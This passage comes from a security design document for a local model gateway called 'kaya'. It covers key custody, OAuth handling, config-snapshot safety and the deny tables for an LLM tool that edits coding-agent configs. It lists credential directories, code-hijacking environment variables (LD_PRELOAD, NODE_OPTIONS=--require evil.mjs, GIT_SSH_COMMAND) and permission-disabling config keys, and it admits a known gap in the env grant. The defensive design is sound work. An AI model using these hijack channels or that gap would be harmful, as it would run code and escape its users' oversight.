  **Placeholder tokens in authentication headers must not go upstream**, enforced after auth injection. Provider-declared custom headers also reject `kaya/` aliases. Content requests rewrite the top-level model alias to the real model; metadata-body passthrough has the exception documented under Boundaries and known limitations below. This is not a claim to remove aliases from every request body. Real keys live only in the keychain and in
  gateway process memory — **while the gateway is enabled, bound entries'
  keys reside in gateway process memory** (previously keys were only read
  out transiently when writing configs or probing). Since 2026-10-14
  (Phase 1.6, full catalog + per-request routing) the in-memory snapshot
  holds keys for **all** library entries (previously bound entries only) —
  resident copies stay memory-only and are never persisted; request authentication sends credentials only to the corresponding configured upstream. The layering discipline
  that kaya-core never touches the keychain holds: the gateway core receives
  entries / keys / bindings exclusively as in-memory snapshots pushed by the
  shell layer — it never reads the library file or the keychain itself.
  Inbound binds 127.0.0.1 only; inbound keys get a shape check ("is it a
  placeholder"), never a truth check (truth never leaves the gateway).
- **The same invariants for OAuth credentials on the gateway side
  (2026-10-17, Phase 3 Task 6)**: an attached OAuth provider's agent config
  is **byte-for-byte the same shape** as api_key — still a per-agent
  placeholder token plus the `kaya/<slug>` alias, and **the OAuth access /
  refresh token never lands in agent config files**. The gateway snapshot
  carries the bearer resolved by the shell (`resolve_bearer`: keychain
  token bundle / `AuthRuntime` in-memory cache; sync pushes do zero
  network, only awaitable trigger points do a near-expiry refresh), and
  each route carries an explicit auth scheme — OAuth is always
  `Authorization: Bearer` (api_key + anthropic family remain `x-api-key`).
  On the first upstream 401 the gateway force-refreshes via the shell hook
  and **replays exactly once** (the new bearer replaces the route
  atomically only after the placeholder / alias hard assertions pass). A
  second 401 carries that attempt's bearer for a conditional check: **the
  route bearer is cleared and the expired marker is set only if it is still
  the current credential** (the UI prompts a re-login). If another request or
  a re-login has already installed a new bearer, the late old 401 must not
  mask or clear it. Route replacement and clearing are both expected-bearer
  compare-and-swap operations under the snapshot write lock. A failed refresh
  passes the 401 through unchanged; **no-credential** failures also clear the
  route bearer only when the expected bearer still matches (becoming
  Passthrough), while transient failures keep the route for a later retry. **The gateway holds only the resolved access bearer,
  in process memory and never on disk**; the OAuth token bundle (access /
  refresh) is persisted only in the system keychain (§8), and the **refresh
  token is never handed to the gateway router** — it is used only inside the
  shell's refresh hook. Gateway audit records zero content (only the actual
  route's `<provider_id>:<model_id>` and category counts). OAuth providers
  do not read leftover api_key keychain entries (a stale key from before an
  auth_kind switch has no effect). **Endpoint allowlist (review C-1)**: every
  enabled endpoint of an OAuth provider must share the **same scheme + host +
  port** as an endpoint declared by the catalog preset — validated on save
  and again on every credential resolution (zero network, fail-closed). If a
  hand-edited library, a restored backup or a UI typo points base_url at
  another host, the real access token (including a freshly refreshed one) is
  never sent there.
- **Zero-content audit** (spec §5/T12, hard invariant): hit events land in
  the audit JSONL (kind `gateway-scrub`, session fixed `"gateway"`) with
  only category counts / byte counts / path / agent / action — **never the
  body, truths, or restored token values** (same doctrine as the existing
  scrub, locked by tests). Audit-write failures leave a warn-level app_log
  line in the other sink (forwarding never blocks).

**Degradation and self-healing** (spec §3.3/§14.3/§14.5/§15.7; 2026-10-14
strict-boundary re-meaning):

- **Write-back on exit (revocation)**: on graceful app exit / gateway stop,
  the kaya-managed traces in bound agents' configs are **revoked**
  (`unapply_config`, idempotent, user-owned config untouched) — under the
  strict boundary kaya no longer writes back any direct config (real base_url
  / key never land in agent configs); the next launch re-attaches them to
  gateway form if the gateway is enabled.
- **Boot reconciliation self-healing**: a killed process gets no write-back
  chance (the dead-config window) — boot reconciles "config form vs gateway
  process state": config pointing at the gateway while the gateway isn't
  running → immediate revocation of the kaya-managed config + warn-level
  app_log. **Inside the window the symptom is agent requests failing with
  connection errors; relaunching kaya heals it.**
- **Running agents can't be saved** (declared expected behavior): write-back
  / reconciliation only fixes configs for agents started *in the future*;
  an agent process that is **already running** when the gateway stops or
  crashes (env already injected with `ANTHROPIC_BASE_URL` etc.) keeps
  pointing at the dead port, and its requests fail until the user restarts
  that agent (see §12).
- **Global mutual exclusion between dev/prod variants**:
  `~/.kaya/gateway/owner.json` (variant + pid + port, 0o600) declares
  ownership; a later-launched variant that finds the gateway held by another
  variant greys out its own toggle and never touches configs; boot
  reconciliation also cleans up stale owners.

**Attach and detach: the per-agent toggle and drift adjudication**
(2026-10-14, Phase 1.5, spec §17, user-decided; same-day strict-boundary
follow-up):

- **Strict boundary (2026-10-14): only two expected config forms remain** —
  gateway form (all preconditions met: gateway enabled && `via_gateway ==
  true` && claude not excluded && entry has a key) and **Revoke (no kaya
  config)**: everything else (gateway off / via=false / no key / claude
  excluded) always runs `unapply_config` to strip the kaya marker keys
  (idempotent, user-owned config untouched); when no kaya trace remains,
  sync never adds config back. **The direct expected form is eliminated
  entirely: real base_url / key never land in agent config files** (every
  former "write back to direct" degradation path now revokes instead).
- **Enabling the gateway never rewrites any agent config**: the master
  toggle only starts the 127.0.0.1 listener; routing through the gateway is
  a **per-agent toggle** ("Route via gateway", on each bound card in the
  Agents panel), and **new bindings default to via=true (attached through
  the gateway)**. Flipping the toggle is what triggers that agent's Revoke ↔
  gateway form migration — config writes still go through the sync
  convergence loop (the `expected_form` gateway precondition: "enabled &&
  via_gateway && not claude-excluded && has key"); the write entry point is
  unchanged.
- **The toggle state persists with the binding** (the library file's
  `bindings` values are objects — since the 2026-10-16 provider-hierarchy
  refactor, `{provider_id, model_id, via_gateway, kaya_managed?}`): legacy
  bindings (bare strings, or legacy carriers without `model_id`) are
  backfilled once on first read and persisted;
  the backfilled via value is **gateway enabled || the agent's on-disk config is
  in gateway form** (gateway on → true, zero disturbance; crash-residue
  gateway form → true, preserving participant semantics; otherwise false),
  and the field is never absent afterwards.
- **Adjudication when the user edits configs (three states)**: an attached
  config matching the expectation → untouched; **partial modification**
  (kaya marker present, values changed externally) → never overwritten and
  never reverted, a warn-level app_log (`drift_conflict:<agent>`) plus a
  "modified outside kaya" badge on the panel, waiting for an explicit
  "Re-attach"; **the kaya-managed block fully removed** → treated as a
  deliberate detach: kaya performs **zero config writes** (the user has
  already removed kaya's traces themselves), sync only persists
  `via_gateway=false` and leaves an info-level log
  (`gateway_via_revoked:<agent>`), and the agent returns to a "bound but
  self-managed config" form that sync never touches again (when no kaya
  trace remains, sync never adds kaya config back).
  Accidental deletion / corruption always lands on the conflict side (the
  safe side — better a badge than deciding for the user).
- Privacy invariants are unaffected: the route projection only includes
  bindings with `via_gateway == true` (a non-attached agent's placeholder
  token gets a 401 at the gate, with no route); authentication-header placeholders are rejected, Content model aliases are rewritten, resident keys stay in memory, and zero-content auditing
  is unchanged.

**The Claude-exclusion toggle** (spec §7.3/§16-E2; 2026-10-14
strict-boundary re-meaning): by default bound claude-code traffic also goes
through the gateway (the complete privacy story: every byte any agent sends
to any model passes redaction); the "Claude direct" toggle in the Settings
gateway section (the persisted field stays `claude_direct`) means
**claude-code is not managed by kaya (excluded)** — no route projection, and
its expected config form is Revoke (kaya marker keys stripped, user-owned
config untouched), not a kaya-written direct config. **Claude
subscription OAuth is never custodied** (Anthropic ToS explicitly forbids
intermediation — a red line): claude-code itself does its own `/login` and
the OAuth stays in the CLI's own keychain; Phase 1 only serves agents with a
**bound entry** (config projection takes bindings as the sole source of
truth — an unbound agent gets no kaya-written config); OAuth custody and
pass-through of unbound forms are deferred to later phases (since Phase 3,
2026-10-17, Kimi device-flow OAuth goes through the unified resolver — the
token still lives only in the local keychain and the gateway receives only
the resolved bearer; OpenAI / Anthropic OAuth remains a coming placeholder,
neither startable nor custodied).
**Routing semantics (Phase 1.6, 2026-10-14, stated plainly)**: beyond the
binding projection, a request whose alias matches a same-family entry in
the **full library catalog** is routed to that entry and injected with its
key (`resolve_alias_route`; unknown or cross-family aliases get a
structured 400 fail-closed) — "who can spend which entry's key" is decided
by catalog + alias, regardless of whether that entry is currently bound.
This matches the key-residency paragraph above (all entries' keys reside
in gateway memory) and the local threat-model paragraph. Likewise, a bound agent whose entry
has **no usable credential** (empty API key / OAuth not signed in or expired)
lands in Revoke even with the gateway enabled and attached (via=true), with
a warn-level note (`gateway_no_key_revoked:<agent>`) on the round that
revokes, plus a panel hint (2026-10-14 review follow-up; since the 2026-10-18
review, the OAuth credential test is **non-empty local access token + not
marked expired + allowlisted endpoints**, with zero network access. `expired`
is treated as no credential for gateway route injection, Chat resolution, and
the agent config's expected form; signing in again clears the marker and
restores gateway form): the gateway has no credential to inject, and a
placeholder token would only shadow the agent's own auth fallback (an
outbound request with no real credential injected gets a silent upstream
401).

**Deviation from the existing PII rules (decided 2026-10-13, stated
plainly)**: the spec §6.6 draft included IP addresses in structured PII, but
**Phase 1 does not implement IP detection** — IPs are high-frequency and
low-sensitivity in coding traffic (mostly loopback / RFC1918), public-IP
classification needs range logic, and the cost is disproportionate for
Phase 1; the IP row in the spec is registered as a deviation, to be
re-evaluated in Phase 2. **Consequence: public IPs in gateway-forwarded
requests (e.g. the user's infrastructure addresses) leave unredacted**;
individual addresses can be covered manually via the user token map. Chat
scrub's existing behavior is unaffected by this deviation.

**Local threat-model boundary (2026-10-15 release review, stated
plainly)**: the gateway binds only to `127.0.0.1` and inbound requests are
authenticated solely by the placeholder-token shape; placeholder tokens
are user-readable random strings written into agent config files — **any
same-machine process that can read the user's files can ride the gateway
outbound and spend a library entry's real key / OAuth bearer** (since Phase 1.6, all
entries' keys reside in gateway process memory; since Phase 3, OAuth bearers
reside there too). This is inherent to any
localhost loopback proxy (CC Switch and similar tools share it): **a
malicious same-machine process is outside this product's threat model** —
kaya's privacy design guards against "data leaving the machine without
authorization" and "the LLM reading files beyond its authority"; an
attacker who already has user-level code execution on the machine can
read any user file outside the keychain directly. This matches §8.2
(the snapshot domain's 0o700/0o600 protects against other users on the
machine and accidental reads, not against root/local attackers).

**Strict takeover and whole-section snapshots (2026-10-19, full-catalog
takeover, spec
`docs/superpowers/specs/2026-10-19-agent-gateway-full-catalog-takeover-design.md`
§7/§8/§13)**: once an agent is attached via the gateway
(`via_gateway=true`), kaya manages that agent's **model surface only**
(provider blocks / kaya model entries / default-model pointers / native
picker·catalog model lists / opencode's `enabled_providers` hiding gate);
permissions / hooks / MCP / plugins / tune and other user settings stay
untouched. Semantics and privacy invariants:

- **Snapshot v2 (whole sections)**: the pre-takeover per-key snapshot is
  extended to "keys + whole sections" (kimi's `providers` / `models`
  tables, opencode's `provider` section / `enabled_providers`, codex
  base's corresponding keys) — `~/.kaya/agent-config-snapshots/<agent>.json`,
  **directory 0o700 / file 0o600 atomic writes**; contents hold user
  originals (possibly including a self-configured third-party gateway's
  base_url / token) and **never enter logs / audit / debug dumps**;
  `agent-config-snapshots/**` is **explicitly excluded** from every
  diagnostic bundle / debug export / support file (locked by tests).
- **Per-agent file lock + snapshot generation**: each agent has one file
  lock (`<agent>.lock`, `create_new` + stale-lock cleanup) covering the
  whole critical section (read config → capture snapshot → write config →
  read-back verify); **an existing snapshot is never overwritten** (two
  concurrent instances reuse it instead of clobbering each other's
  pre-takeover originals); all locked writes are tmp+rename atomic.
- **Deletion-style takeover (kimi) and merged restore (§8.5)**: non-kaya
  entries that existed at takeover are snapshotted then removed/hidden;
  entries added after takeover are kept. Restore (Revoke / gateway stop /
  exit write-back / boot crash reconcile — four paths sharing one
  implementation) only re-adds entries missing from the snapshot, with
  **current values winning** (trace `snapshot_merge_kept_current`, info
  level); read-back mismatches log `snapshot_restore_mismatch` (counts
  only, never names). Restore writes via `write_atomic` and produces
  **no `.bak`** — `.bak` only appears on the two pre-existing paths
  (regular config writes and the v1→v2 snapshot upgrade); this is the
  final ruling that resolves the literal tension with the earlier "write
  `.bak` before restore" line (see spec §8.4).
- **v1 snapshot compatibility and v1→v2 upgrade**: a v1 snapshot (no
  sections) can always complete Revoke (pure strip + key write-back,
  logging info `snapshot_v1_no_sections`, never blocking); the first sync
  upgrades it — non-kaya whole sections are captured into v2 sections and
  the original v1 file is kept as `<agent>.json.v1.bak`; on capture
  failure the non-kaya entries are **not** deleted.
- **Diagnostic exclusion**: snapshots (including `.v1.bak`) share the
  same 0o600 permissions and the whole directory is excluded from
  diagnostic exports — the snapshot is the single stated exception to
  "real keys never hit disk", protected by the `~/.kaya` domain
  permissions (§8.2 table).
- **Fail-closed outbound**: after full-catalog takeover, agent content
  requests (including internal side tasks — claude's small-fast / haiku
  title-generation keys, codex compaction/summary, and opencode titles)
  must carry a `kaya/<alias>` by default. A bare model name is rejected at
  the gateway with 400 `kaya_gateway_unmanaged_model` (self-explaining
  error body: code / message / hint / docs_url) and never forwarded;
  `GET|HEAD /health` and `/healthz` are answered locally with 200, require
  no token, and are neither counted nor audited. Gateway rejection logs
  record only the reason category — never the body or model name.
  - **The only narrow exception is an explicitly globally taken-over Codex
    bound to ChatGPT Responses**: the base provider carries the internal
    header `x-kaya-codex-global-takeover: 1`. The ordinary `--profile kaya`
    explicitly carries the disabled value `0`, preventing Codex's deep merge
    from inheriting the base's enabled value. Bare built-in model names are
    accepted only when the Codex placeholder token, the enabled header, and
    the ChatGPT Responses binding are all present. Metadata, other
    agents/providers, and ordinary third-party tools still reject bare names
    with 400. The header is reserved, stripped before forwarding, never sent
    to OpenAI, and cannot be injected through provider custom headers.
- **Boundaries and known limitations (stated plainly)**:
  - After the v1→v2 library migration, a `slug=None` model in an existing
    v2 store is a **transitional state** — it is backfilled by
    `ensure_model_slugs` on the next upsert of that provider; there is no
    boot-time sweep (until backfilled, multi-model rows of that provider
    resolve through the legacy fallback-alias double lookup; with ≥2
    enabled models in the family the gateway rejects with
    `RejectAmbiguous` 400, and the picker advertises only when the family
    has exactly one).
  - **Metadata-body passthrough exception**: on ordinary native routes, permitted metadata requests such as `POST /v1/models` can carry a resolvable `kaya/<alias>` unchanged to the bound upstream, without switching routes by that alias. The `GET|HEAD /v1/models` list and `GET /v1/models/{id}` retrieval are answered locally. Anthropic `count_tokens` is Content, not Metadata: tokenization and top-level model rewriting apply. Adapter and ChatGPT routes additionally enforce their exact endpoint restrictions and reject unsupported paths locally. Authentication-placeholder rejection and custom-header checks do not inspect every metadata body.
  - Snapshot `.v1.bak` files are **deleted together with the snapshot
    after a successful restore** (the user's original values are already
    written back, so the backup is only a redundant **plaintext copy of
    the user's keys**); on a failed restore they are **kept** (they may
    be the last copy of the user's original values). A corrupt snapshot
    (file present, unparsable) is surfaced by boot reconcile as a
    `snapshot_corrupt:<agent>` warning and the **file is kept** (not
    silently skipped, never auto-deleted); the restore-write `Err`
    branch **retries once** as the spec requires (the snapshot is kept;
    only after two failed rounds is `snapshot_restore_failed` reported).
  - **Deleting / overwriting a user's own values always requires that they
    are recoverable** (2026-10-20, one contract covering three surfaces):
    - **Root cause (capture side)**: the takeover snapshot's "the
      pre-takeover state is unknown" placeholder semantics apply **only to a
      config that is already in kaya shape**. The capture argument is the
      **real on-disk kaya-marker state** (a failed marker read fails closed
      to "not a placeholder"): no marker means the config is the user's own
      → the capture is a **real capture** and the user's original values
      (`env.ANTHROPIC_API_KEY` / `env.ANTHROPIC_BASE_URL` /
      `env.ANTHROPIC_MODEL`, kimi's `default_model`, opencode's `model`,
      and the whole provider/model sections) go into the snapshot verbatim
      → deleting or overwriting them during takeover is **recoverable** (a
      detach or crash reconcile writes them back). Deleting / overwriting
      while the snapshot lacks the user's original values is an
      unrecoverable data loss.
    - **Consumer side (deleting a key)**: claude's
      `env.ANTHROPIC_API_KEY` is removed **only when the snapshot holds the
      exact on-disk value that would be deleted**; a missing or stale
      snapshot means the key is **kept** and a
      `claude_user_api_key_kept:claude-code` warning is left.
    - **Consumer side (overwriting keys)**: endpoint / model-pointer managed
      keys (claude's `env.ANTHROPIC_BASE_URL` / `env.ANTHROPIC_MODEL` /
      `model`, kimi's `default_model`, opencode's `model`) are overwritten
      only when the config is **already in kaya shape** or a **real capture
      snapshot** exists; with neither (snapshot missing / placeholder
      only) they are **not overwritten this round** — only the kaya-owned
      namespace is written and a `takeover_not_restorable:<agent>` warning
      is left.
    - The deletion-style takeovers (kimi foreign entries / opencode foreign
      provider blocks / codex base) likewise require a usable snapshot:
      without one only the kaya namespace is written and nothing is deleted.
    - **Values the user changed afterwards** are handled by the §17.4 drift
      ruling (marker present + values changed → conflict, no overwrite); the
      gates above only cover the "snapshot missing / placeholder" class.
  - **Real-device checklist** (before release): the claude `--settings`
    isolation file's compatibility floor on older claude versions; the
    opencode `enabled_providers` gate version threshold (currently a
    1.18.0 heuristic); the codex catalog vision modality field
    (2026-10-20 batch one now overwrites `input_modalities` from the
    model's effective vision value — the field name is taken from the
    locally measured `codex debug models --bundled` output; the bundled
    catalog has **no** `supports_vision` field; a wrong field name breaks
    catalog parsing, so real-device confirmation is still required).

**Batch-one additions (2026-10-20, model gateway × agent-config usability
batch one, spec
`docs/superpowers/specs/2026-10-20-agent-gateway-usability-batch1-design.md`
§4/§5/§6/§9/§10)**: the gateway side gains three capabilities — provider-level
custom headers, a session fingerprint, and an upstream-hang guard — plus a
desktop-side provider connectivity self-check and projection-diagnostic
transparency. Privacy posture:

- **Provider-level custom headers `extra_headers` (quasi-sensitive)**: the
  model library v2 `ModelProvider` gains `extra_headers`
  (`BTreeMap<header name, value>`), persisted with the library file
  `~/.kaya/model-library.json` (0o600 atomic write — same permission as the
  existing library file). **Values are treated as quasi-sensitive**: they
  never enter app_log / audit / debug dump / LLM context; header names /
  values leave **zero trace** (the injection helper returns a count, but the
  caller currently **discards** it — not even "N headers injected" is
  recorded). **This batch ships no UI control**: the values only reach the
  library file through the catalog prefill (the OpenCodeGo / OpenCode
  presets ship `x-opencode-session = $KAYA_SESSION_FINGERPRINT` in the
  overlay; a user may also edit the library file directly). Values cross IPC
  into the WebView runtime mirror for draft round trips, but are not rendered
  or persisted in localStorage, logs, audit, or LLM context. All semantic
  validation lives in the Rust-side upsert funnel. If a UI is added later it must warn "do not
  store API-key-like credentials here — use the API Key field for
  credentials".
  - **Reserved-name validation**: header names may not be `authorization` /
    `x-api-key` / `host` / `content-length` / `connection` /
    `transfer-encoding` / `accept-encoding` / `keep-alive` / `te` /
    `trailer` / `upgrade` nor the `proxy-*` prefix (the **same table** as
    the gateway's hop-by-hop strip surface, single source
    `is_reserved_extra_header_name`), and must be ASCII tokens ≤64 chars;
    values ≤512 bytes with no control characters. Validation lives in the
    model-library upsert funnel — **invalid entries are refused**.
  - **Injection order**: after tokenization → auth injection →
    `inject_extra_headers` → the placeholder hard assertion. The injected
    header names / values **also pass the placeholder assertion**: neither
    the placeholder token (`kayagw_`) nor the alias form (`kaya/`) may ever
    leave the gateway (byte-level substring search, so an invalid-UTF-8
    header value cannot bypass it). If the inbound request already carries
    the same header name (case-insensitive) the injection is **skipped**
    (the agent's own header wins; end-to-end pass-through semantics
    unchanged). An injection failure (illegal header value / sentinel
    evaluation failure) degrades to "skip that header" and **never blocks
    the request**.
  - **Custom headers never land in agent config**: they are a **routing
    attribute**, injected by the gateway on the outbound path per provider
    — a header written into the agent config would be passed through to
    *every* upstream provider (MiniMax's header leaking to DeepSeek). The
    strict boundary is unchanged.
- **Session fingerprint `$KAYA_SESSION_FINGERPRINT`**: a custom header value
  may carry a dynamic sentinel, evaluated per request into a session
  fingerprint = SHA-256 (the `system` field plus the first user message of
  the **tokenized** body, recursively stripping `cache_control`), first 32
  hex chars, prefixed with `kaya-`.
  - **One-way**: SHA-256 is not reversible; the fingerprint **does not map
    back to content** and contains no reconstructable fragment of the body
    (tokens are content-addressed HMACs — the true value never leaves the
    hash).
  - **Never leaves the gateway**: the fingerprint travels only as the value
    of an outbound custom header to **that provider's own endpoint**; it
    never enters logs / audit / debug dump / LLM context.
  - **Fallback is not persisted**: a non-chat body or a failed evaluation
    falls back to a route-level stable random value (`kaya-<uuid>`, living
    with the `EntryRoute`, **never written to disk**; it is re-minted on
    every snapshot assembly, so it is unpredictable across snapshots —
    session affinity is carried by the body fingerprint; the fallback only
    guarantees "there is a value to send"); an unknown `$KAYA_` sentinel
    skips that header — the sentinel literal is never sent out.
- **Upstream-hang guard**: the time-to-headers leg (from `send()` until
  response headers arrive: stalled request-body writes + waiting for
  headers) has a 300s time-to-headers timeout (one semantics-agnostic bound;
  it covers both hops of a 401 replay), closed out as a structured 504;
  streaming responses get an **inter-frame idle
  watchdog** (default 120s; configurable via the gateway config's
  `stream_idle_timeout_secs`, persisted with the same mechanism as the scrub
  level) — it bounds the gap **between frames** and deliberately does **not**
  impose a total stream duration; non-streaming requests get a separate
  300s total timeout (504 structured close-out). Successful non-streaming and
  adapted error responses are read in chunks with a 64MiB cumulative body cap,
  including any SSE-sniffing prefix. Exceeding it stops reading and returns a
  protocol-shaped 502 `kaya_gateway_upstream`, records `upstream_error`, and
  includes no response original in the error. On abort / stream break the
  gateway emits **one protocol-appropriate terminal frame** (Anthropic
  `event: error` / Chat error chunk + `[DONE]` / Responses
  `response.failed`, **never** a `completed`) and then closes the stream
  normally; the agent side sees "one failed request" and its own retry takes
  over, replacing infinite hangs / bare truncation. The app_log warnings
  `gateway_upstream_idle_timeout` / `gateway_upstream_stream_error` /
  `gateway_upstream_nonstream_timeout` / `gateway_upstream_headers_timeout`
  are **zero-content**: no body, no
  URL, no key, no response payload. All four carry the `route_entry` =
  `<provider_id>:<model_id>` of the effective route — the **model id is
  configuration metadata and may be carried** (same posture as the model
  ids in `gateway_projection_excluded` below); it is not "content". Only
  the three timeout events carry seconds (`idle_secs` / `timeout_secs`); the
  break event `gateway_upstream_stream_error` records **no seconds** (a
  break has no idle window to measure). The counters surface through
  `gateway_get_status` as `upstream_timeouts` / `upstream_stream_errors`
  (pure counts).
- **Projection-diagnostic transparency (2026-10-20 batch one §5)**: models
  excluded by the four projection conditions are no longer dropped silently
  — `gateway_get_status.projection_diag` returns per-agent detail
  (provider_id / provider_name / model_id / reason). **Model ids are
  configuration metadata and may be carried** (so the user can see *why* a
  model was not wired in); but the app_log event
  `gateway_projection_excluded` records **only counts and the reason
  distribution, never a model-id list** — the same zero-content posture as
  the audit trail.
- **Provider connectivity self-check `model_provider_test_connection`**: a
  desktop-side command whose semantics are "can the endpoint complete one
  HTTP round-trip" —
  - **Credentials only enter the auth header**: `Authorization: Bearer`
    (api_key for chat/openai and **all** protocols for OAuth) or `x-api-key`
    + `anthropic-version` (api_key + anthropic); local endpoints (Ollama /
    vLLM class) may be probed without a key. Credentials never enter the
    URL, the body, or the log.
  - **Response body ≤64 KiB, read then discarded**: not parsed, not
    persisted, not logged. The verdict is fixed **the moment the headers
    arrive** (a stalled body must not turn an already-answered 200 into a
    timeout).
  - **Any HTTP response counts as "endpoint reachable"**: 2xx/3xx → `ok`;
    401/403 → `auth` ("reachable, credentials may be invalid"); anything
    else → `http_status` + `http_status:<code>`; timeout → `timeout`;
    transport failure → `network`; OAuth not signed in / expired →
    `skipped_oauth` (**zero network**). It **does not validate model
    availability**, **does not write the library**, and has no polling.
  - **Fixed sentinel error family**: pre-flight failures (library read /
    keychain read / no endpoint / illegal base_url / missing key for a
    remote endpoint / provider not found) all reuse the `model_fetch_*`
    sentinel family; raw error strings **never reach the wire** (the
    frontend localizes by sentinel). The app_log records only
    `{provider_id (clamped), status, latency_ms, error}` — URL / key / body
    never enter the log.

### Agent context layering (2026-09-24)

- **Activity ledger and location injection**: watcher events (whose payloads
  have already passed scrub at the pipeline exit) keep a rolling window of
  the latest 20 state summaries per agent inside the registry; together with
  cwd (reported by your terminal via OSC 7), pane project labels
  (user-entered), and kaya's own dispatch records, they are injected into
  the LLM context through the existing fingerprint dedup. The trust level
  matches the situation block above and adds no new exfiltration surface.
  The registry is purely in memory and never written to disk.
- **agent_report tool**: reads the tail of `~/.kaya/terminal/<tab_id>.log`
  on demand (64 KB by default, 256 KB cap) — a widened terminal_read window
  at the same trust level. Privacy invariant: output first goes through
  AnsiCleaner to reconstruct terminal line overwrites (`\r` / `ESC[K` /
  `\x08` / wrap-joining, so zsh redraws cannot shred secrets into
  fragments), then through output scrub (~30 secret/PII regex classes plus
  whole-PEM redaction); the ordering is locked by tests.

**list_dir directory listing (sandbox + hard-denied credential dirs)**: chat's
`list_dir` tool can only list directories inside the union of `cwd ∪ home ∪
~/.kaya/` (component-wise prefix comparison after canonicalize, so symlink
escapes are denied too), and it **returns filenames only, never contents**.
Since 2026-10-04, credential directories under home (`~/.ssh` / `~/.aws` /
`~/.gnupg` / `~/.docker` / `~/.kube` / `~/.azure` / `~/.password-store` /
`~/.config/gh` / `~/.config/gcloud` / `~/Library/Keychains`, and any of their
subdirectories) are **hard-denied** (previously the only guard was a
prompt-level request in the tool description) — enumeration is information
disclosure: once `id_rsa` is known to exist, an attacker can target it in a
follow-up call.

**Agent config file read/write (2026-08-17, P2-F1; codex 2026-09-08)**: chat's
`agent_config` tool can read and modify the CLI config files of the four
supported coding agents: claude-code → `~/.claude/settings.json`, kimi-code →
`~/.kimi-code/config.toml`, opencode → `~/.config/opencode/opencode.json`,
codex → `$CODEX_HOME/config.toml` (`CODEX_HOME`, or `~/.codex` by default).
- **Reads**: `action="read"` output is first masked by key name (keys named
  key/token/secret/password show only the first 4 chars + `***`), then passed
  through the secret scrubber as a safety net (secrets under non-matching key
  names never reach the model either).
- **Edits require explicit approval**: `action="edit"` is a persistent write —
  every edit lands only after you approve the grant card in the chat. The card
  shows only the target file path and the top-level **key names** being merged
  (patch values may contain secrets and are never put on the card or in the
  event). The grant lives in memory, bound to the (conversation, agent) pair —
  a new chat session asks again, and an app restart clears all grants. Without
  a grant the model only gets a "waiting for user approval" marker and no
  bytes are written.
- **Backup before write**: every write first backs up the previous version to
  `<file>.bak`; the deep merge preserves existing fields the patch does not
  mention.
- **Execution/privilege-escalation top-level keys are always refused**
  (per-agent deny table since v2.1.10; codex table added 2026-09-08): these
  keys can bind arbitrary commands to the agent's later runs or disable the
  agent's own permission gate entirely; merge requests containing them are
  denied outright (no grant card is even shown) — edit the config file
  manually instead. Deny tables: claude-code → `hooks` / `statusLine` /
  `apiKeyHelper` / `enabledPlugins` / `permissions`; opencode → `hooks` /
  `plugin` / `mcp`; codex → `hooks` / `approval_policy` / `sandbox_mode` /
  `sandbox_workspace_write` / `rules` / `mcp_servers` / `notify` / `projects`;
  kimi-code and any other agent keep the generic floor `hooks`.
- **Model-identity keys are refused the same way (2026-09-10)**: claude-code's
  `model` / `modelPicker` plus the 12 keys inside its `env` sub-table
  (`ANTHROPIC_BASE_URL` / `ANTHROPIC_MODEL` / `ANTHROPIC_AUTH_TOKEN` /
  `ANTHROPIC_API_KEY` / `ANTHROPIC_SMALL_FAST_MODEL` /
  `ANTHROPIC_DEFAULT_{OPUS,SONNET,HAIKU}_MODEL` /
  `ANTHROPIC_DEFAULT_{OPUS,SONNET,HAIKU}_MODEL_NAME` /
  `CLAUDE_CODE_MAX_CONTEXT_TOKENS`, case-insensitive, reported as a dotted
  path), kimi-code's `providers` / `models` / `default_model`, opencode's
  `provider` / `model`, and codex's `model` / `model_provider` /
  `model_providers` / `model_catalog_json` are denied outright before the
  grant gate — the file and its `.bak` are left untouched. The model library
  (Settings → Models) is the only way in: an agent config file is a
  projection of a library entry and is written by kaya alone. The refusal
  text points at the model library and never tells the user to hand-edit the
  config file. This absorbs codex's `model_providers`, so the earlier nested
  backstop `model_providers.<id>.auth` (final review, 2026-09-08) is gone
  (no dead code; `denied_patch_nested` stays as an extension point and
  currently always returns `None`). The grant-commit command
  `agent_config_edit_respond` **deliberately does not** check these keys:
  they are already denied before the tool-level grant gate and can never
  enter the grant set — adding a check there would change the security gate's
  "approved key set" semantics for no reachable gain. `action="read"` is
  unaffected: the model can still see the currently effective base_url /
  model when diagnosing config problems.
  - **Boundary (final review, 2026-09-10 — stated as-is)**: `env` sub-keys are
    refused on a **whitelist basis** — only the 12 keys listed above are
    denied; every other `env.*` sub-key **remains writable** (for example
    `ANTHROPIC_BEDROCK_BASE_URL` / `ANTHROPIC_VERTEX_BASE_URL` /
    `CLAUDE_CODE_USE_BEDROCK` / `CLAUDE_CODE_USE_VERTEX` /
    `CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST`, which redirect the agent to a
    Bedrock/Vertex endpoint or change provider ownership — arguably the same
    class of risk, but turning them into an `env`-prefix rule would change the
    semantics of the security table and deserves a decision of its own rather
    than being folded into this change). Second, also stated as-is: the grant
    card lists **top-level key names only** (here, the single word `env`) and
    does **not** expand sub-keys — so once you approve an `env` merge request,
    its sub-keys are not visible to you. To tighten this boundary, extend the
    `denied_model_identity_keys` enumeration first and then update this table.
- **Dangerous environment variables are refused the same way (2026-10-04
  review M2; keys extended in independent review I5)**: grants bind to
  **top-level key sets** — approving `env` once lets the model write any
  sub-key afterwards; dangerous variable names inside the `env` sub-table
  (`NODE_OPTIONS` / `NODE_PATH` / `DYLD_INSERT_LIBRARIES` /
  `DYLD_LIBRARY_PATH` / `LD_PRELOAD` / `LD_LIBRARY_PATH` / `PATH` /
  `BASH_ENV` / `ENV` / `PYTHONSTARTUP` / `GIT_SSH_COMMAND` / `GIT_SSH` /
  `GIT_EDITOR` / `EDITOR` / `VISUAL`, case-insensitive, agent-agnostic,
  reported as a dotted path) are code-execution / command-hijacking
  channels (`NODE_OPTIONS=--require evil.mjs` runs at startup for the
  Node-based agents; `GIT_SSH_COMMAND` turns the next git fetch/push into
  arbitrary command execution). They are denied at the same checkpoint as
  identity keys (outright denial before the grant gate, with `apply_patch`
  as the backstop — the file and its `.bak` are left untouched). Unlike
  identity keys, these have no kaya-managed entry point, so the refusal
  text points at **manual editing**. The model-library sync path never
  goes through `apply_patch` (the agent_config tool is its only production
  caller) and is unaffected. **Known boundary**: the table is an
  enumeration and cannot be exhaustive — module-shadowing variables
  (`PYTHONPATH` / `PERL5LIB` / `RUBYLIB`) have no execution surface for the
  current built-in agents (Node/Rust-based) and are not listed yet; the
  direction is fail-closed incremental additions as channels are found.
- **Audit**: every grant request and every successful write appends one line
